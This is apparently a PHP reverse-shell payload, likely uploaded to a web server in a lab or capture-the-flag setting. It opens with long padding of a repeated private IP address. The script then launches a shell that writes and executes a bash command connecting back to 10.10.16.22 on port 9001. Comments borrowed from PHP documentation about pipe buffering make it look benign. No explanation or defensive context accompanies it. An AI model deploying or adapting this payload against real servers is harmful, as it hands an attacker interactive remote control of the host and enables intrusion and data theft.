10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
10.10.16.22
<?php
/* assume that strlen($in) is about 30k
*/
$descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("file", "/var/www/dev/error-output.txt", "a")
);
$process = proc_open('sh', $descriptorspec, $pipes);
if (is_resource($process)) {

  fwrite($pipes[0],'echo "bash -i >& /dev/tcp/10.10.16.22/9001 0>&1" > /tmp/shell.sh | chmod 777 /tmp/shell.sh p| bash /tmp/shell.sh');
   /* fwrite writes to stdin, 'cat' will immediately write the data from stdin
   * to stdout and blocks, when the stdout buffer is full. Then it will not
   * continue reading from stdin and php will block here.
   */
  fclose($pipes[0]);
  while (!feof($pipes[1])) {
      $out .= fgets($pipes[1], 1024);
  }
  fclose($pipes[1]);
  $return_value = proc_close($process);
}